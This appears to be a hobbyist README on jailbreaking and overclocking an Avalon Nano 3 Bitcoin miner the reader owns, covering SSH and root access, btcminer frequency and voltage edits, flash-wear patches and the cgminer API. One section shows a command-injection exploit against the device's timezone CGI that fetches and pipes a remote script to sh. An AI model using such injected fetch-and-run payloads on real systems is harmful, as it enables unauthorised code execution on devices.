# 🔧 Avalon Nano 3 - Complete Hacking & Overclocking Guide

> **Firmware Version:** 25103101 (and newer)  
> **Author:** Based on research from [orca.pet](https://orca.pet/nanojb/)  
> **Language:** English / Русский

---

## ⚠️ Disclaimer

**Warning!** All actions are performed at your own risk. Overclocking may lead to:
- Device overheating
- Reduced lifespan of ASIC chips
- Unstable operation
- Warranty void

The author is not responsible for any consequences.

---

## 📋 Table of Contents

1. [Getting SSH Access](#getting-ssh-access)
2. [Getting Root Access](#getting-root-access)
3. [Overclocking the Miner](#overclocking-the-miner)
4. [Reducing Flash Wear](#reducing-flash-wear)
5. [Verifying Results](#verifying-results)
6. [Recovery](#recovery)
7. [Sources & Documentation](#sources--documentation)

---

## 🔓 Getting SSH Access

### Method 1: Via Patched Firmware (Recommended)

**Important:** On firmware version 25103101, the timezone vulnerability is **patched**. The only way to get SSH is to flash a modified firmware.

#### Step 1: Download Patched Firmware

Find a patched firmware with built-in SSH (dropbear):
- Format: `.swu` (for web interface update)
- Size: ~50 MB

#### Step 2: Flash via SWUpdate

1. Open browser and go to: `http://YOUR_MINER_IP:9090/`
2. Drag and drop the `.swu` file to the upload area
3. Wait for completion (~2-5 minutes)
4. Miner will automatically reboot

#### Step 3: Connect via SSH

```bash
# Login: admin, Password: admin
ssh admin@YOUR_MINER_IP
# Password: admin
```

---

### Method 2: Timezone Exploit (DOES NOT WORK on v25103101)

> ⚠️ This method **does not work** on firmware 25103101 and newer. Vulnerability is patched.

On older firmwares (24071801):

```bash
# Via curl
curl 'http://YOUR_MINER_IP/timezoneconf.cgi' \
  -b 'auth=ff0000ff4813494d137e1631bba301d5' \
  --data-raw 'timezone=%3Bwget%20http://orca.pet/nanojb/n.sh%20-O-%7Csh%3B'

# Or via browser console (F12)
await fetch("/timezoneconf.cgi", {
  "body": "timezone=" + encodeURIComponent(";wget http://orca.pet/nanojb/n.sh -O-|sh;"),
  "method": "POST"
});
```

---

## 🔑 Getting Root Access

After connecting via SSH:

```bash
# Switch to superuser mode
sudo -i
# Password: admin (same as SSH)
```

**Verify root access:**
```bash
whoami
# Should output: root
```

---

## ⚡ Overclocking the Miner

### Overclocking Parameters

| Parameter | Range | Description |
|-----------|-------|-------------|
| `--avalon10-freq` | 25-800 MHz | ASIC chip frequency |
| `--avalon10-voltage` | 1150-1450 mV | Supply voltage |
| `--avalon10-freq-sel` | 0-4 | Frequency level |
| `work_level` | 0-2 | Work mode (0=Low, 1=Medium, 2=High) |

### Recommended Profiles

| Profile | Frequency | Voltage | Hashrate | Temperature | Risk |
|---------|-----------|---------|----------|-------------|------|
| **Stock** | 500 MHz | 1200 mV | ~4 TH/s | 50-60°C | Minimal |
| **Light** | 550 MHz | 1225 mV | ~4.5 TH/s | 55-65°C | Low |
| **Medium** | 600 MHz | 1250 mV | ~5.5 TH/s | 60-70°C | Medium |
| **High** | 650 MHz | 1275 mV | ~6.5 TH/s | 65-75°C | High |
| **Extreme** | 700 MHz | 1300 mV | ~7.5 TH/s | 70-80°C | Very High |

### Applying Overclock

#### Step 1: Set work_level

```bash
sudo -i
sed -i 's/work_level *= *.*/work_level = 2/' /data/usrcon/systemcfg.ini
cat /data/usrcon/systemcfg.ini | grep work_level
# Should output: work_level = 2
```

#### Step 2: Add overclock parameters

```bash
# Backup
cp /etc/init.d/rcS /etc/init.d/rcS.bak

# Add parameters (700 MHz / 1300 mV)
sed -i 's|^\./btcminer .*|./btcminer --avalon10-freq 700 --avalon10-voltage 1300 --listen-api \&|' /etc/init.d/rcS

# Verify
grep btcminer /etc/init.d/rcS
# Should output: ./btcminer --avalon10-freq 700 --avalon10-voltage 1300 --listen-api &
```

#### Step 3: Reboot miner

```bash
reboot
```

---

## 💾 Reducing Flash Wear

### Patch 1: Logs to RAM

By default, logs are written to flash memory, reducing its lifespan. Let's move logs to RAM:

```bash
sudo -i

# Create symlink
if ! [ -L /data/log ]; then
  rm -rf /data/log
  ln -s /tmp/zlog /data/log
fi
mkdir -p /tmp/zlog

# Verify
ls -la /data/log
# Should output: lrwxrwxrwx ... /data/log -> /tmp/zlog
```

### Patch 2: Disable Shell History

Disable bash history saving (also writes to flash):

```bash
sudo -i
echo "export HISTFILE=" | tee /etc/profile.d/no-history.sh

# Verify
cat /etc/profile.d/no-history.sh
# Should output: export HISTFILE=
```

---

## ✅ Verifying Results

### Check btcminer process

```bash
ps aux | grep btcminer
# Should output: ./btcminer --avalon10-freq 700 --avalon10-voltage 1300 --listen-api
```

### Check hashrate via cgminer API

```bash
# Connect to API
echo '{"command":"devs"}' | nc -w 3 YOUR_MINER_IP 4028 | strings

# Example output:
# "MHS 5s":7500000.00  (7.5 TH/s)
# "Freq":700.00
# "Temperature":75.00
```

### Check temperature and status

```bash
echo '{"command":"summary"}' | nc -w 3 YOUR_MINER_IP 4028 | strings
```

### Check work_level

```bash
cat /data/usrcon/systemcfg.ini | grep work_level
# Should output: work_level = 2
```

### Check logs in RAM

```bash
ls -la /data/log
# Should output: lrwxrwxrwx ... /data/log -> /tmp/zlog

ls -la /tmp/zlog
# Should have log files
```

---

## 🔙 Recovery

### Reset overclock

```bash
sudo -i

# Reset work_level
sed -i 's/work_level *= *.*/work_level = 0/' /data/usrcon/systemcfg.ini

# Reset btcminer parameters
sed -i 's|^\./btcminer --avalon10.*|./btcminer \&|' /etc/init.d/rcS

# Verify
grep btcminer /etc/init.d/rcS
# Should output: ./btcminer &

reboot
```

### Full reflash

If miner doesn't boot:

1. Download original firmware from Canaan repository
2. Connect miner to PC via USB while holding reset button
3. Flash via KendryteBurningTool

---

## 📚 Sources & Documentation

### Main Sources

| Resource | Description |
|----------|-------------|
| [orca.pet/nanojb/](https://orca.pet/nanojb/) | Complete Avalon Nano 3 hacking documentation |
| [GitHub: ckolivas/cgminer](https://github.com/ckolivas/cgminer) | cgminer source code |
| [Canaan Kendryte](https://kendryte.com/) | K230 SoC documentation |

### CGMiner API

**Port:** 4028  
**Protocol:** JSON over TCP

#### Main Commands:

```bash
# Device information
echo '{"command":"devs"}' | nc -w 3 YOUR_MINER_IP 4028

# Pool information
echo '{"command":"pools"}' | nc -w 3 YOUR_MINER_IP 4028

# Summary information
echo '{"command":"summary"}' | nc -w 3 YOUR_MINER_IP 4028

# Configuration
echo '{"command":"config"}' | nc -w 3 YOUR_MINER_IP 4028

# Restart
echo '{"command":"restart"}' | nc -w 3 YOUR_MINER_IP 4028
```

#### Example API Response:

```json
{
  "STATUS": [
    {
      "STATUS": "S",
      "When": 1772984626,
      "Code": 9,
      "Msg": "1 ASC(s)",
      "Description": "cgminer 4.11.1"
    }
  ],
  "DEVS": [
    {
      "ASC": 0,
      "Name": "AVANANO",
      "ID": 0,
      "Enabled": "Y",
      "Status": "Alive",
      "Temperature": 75.00,
      "MHS 5s": 7500000.00,
      "MHS av": 7200000.00,
      "Freq": 700.00,
      "Accepted": 150,
      "Rejected": 2,
      "Hardware Errors": 0
    }
  ]
}
```

### btcminer Command Line Parameters

```bash
./btcminer [OPTIONS]

Main options:
  --avalon10-freq <MHz>        ASIC frequency (25-800)
  --avalon10-voltage <mV>      Voltage (1150-1450)
  --avalon10-freq-sel <0-4>    Frequency level
  --listen-api                 Enable API (port 4028)
  --help                       Show help
```

---

## 📁 Miner File Structure

```
/
├── etc/
│   ├── init.d/
│   │   └── rcS              # Init script (btcminer here)
│   └── profile.d/
│       └── no-history.sh    # History disabled
├── data/
│   ├── usrcon/
│   │   └── systemcfg.ini    # Configuration (work_level)
│   └── log -> /tmp/zlog     # Symlink to RAM
├── tmp/
│   └── zlog/                # Logs in RAM
└── mnt/
    └── heater/
        └── www/
            └── html/        # Web interface
```

---

## 🛠️ Useful Commands

```bash
# Reboot miner
reboot

# Check temperature
echo '{"command":"devs"}' | nc -w 3 YOUR_MINER_IP 4028 | strings | grep Temperature

# Check hashrate
echo '{"command":"devs"}' | nc -w 3 YOUR_MINER_IP 4028 | strings | grep "MHS 5s"

# Check errors
echo '{"command":"devs"}' | nc -w 3 YOUR_MINER_IP 4028 | strings | grep "Hardware Errors"

# View logs
tail -f /tmp/zlog/btcminer.log

# Check running processes
ps aux

# Check free memory
free -m
```

---

## 📞 Support & Discussion

- **Official Thread:** [Avalon Nano 3 unofficial thread](https://bitcointalk.org/)
- **Documentation:** [orca.pet/nanojb/](https://orca.pet/nanojb/)
- **GitHub Issues:** [Your Repository]

---

## 📝 Changelog

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2026-03-08 | Initial guide release |

---

**Happy overclocking! 🚀**

*If this guide helped you, please ⭐ on GitHub!*
# avalon-nano3-overclock
# avalon-nano3-overclock

---

## 💰 Support the Project

If this guide helped you, consider donating: [**DONATE.md**](DONATE.md)


---

## 🔬 Firmware Dump & Analysis

Want to dive deeper? Check out our complete firmware dumping guide: [**FIRMWARE_DUMP.md**](FIRMWARE_DUMP.md)

Topics covered:
- Extracting firmware with binwalk
- UBI partition analysis
- Modifying btcminer parameters
- Building custom SWU images

